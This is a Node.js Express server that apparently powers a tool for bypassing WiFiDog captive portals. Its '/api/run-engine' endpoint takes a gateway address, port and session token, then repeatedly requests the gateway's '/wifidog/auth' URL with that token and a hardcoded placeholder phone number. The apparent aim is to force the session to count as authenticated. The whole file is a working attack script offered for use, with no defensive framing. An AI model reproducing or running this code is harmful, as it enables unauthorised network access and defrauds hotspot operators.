const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

app.get('/api/check-net', async (req, res) => {
    try {
        const response = await fetch('http://www.google.com/generate_204', { 
            signal: AbortSignal.timeout(3000) 
        });
        res.json({ connected: response.status === 204 || response.status === 200 });
    } catch (error) {
        res.json({ connected: false });
    }
});

app.post('/api/run-engine', async (req, res) => {
    const { gwAddress, gwPort, sessionId } = req.body;

    if (!gwAddress || !gwPort || !sessionId) {
        return res.status(400).json({ success: false, message: 'လိုအပ်သော အချက်အလက်များ မပြည့်စုံပါ!' });
    }

    const authLink = `http://${gwAddress}:${gwPort}/wifidog/auth?token=${sessionId}&phonenumber=12345`;
    let successCount = 0;
    const totalRequests = 15;

    for (let i = 0; i < totalRequests; i++) {
        try {
            const resp = await fetch(authLink, { signal: AbortSignal.timeout(2000) });
            if (resp.ok) successCount++;
        } catch (err) {}
    }

    res.json({
        success: true,
        message: 'Engine requests sent successfully.',
        stats: { total: totalRequests, success: successCount }
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
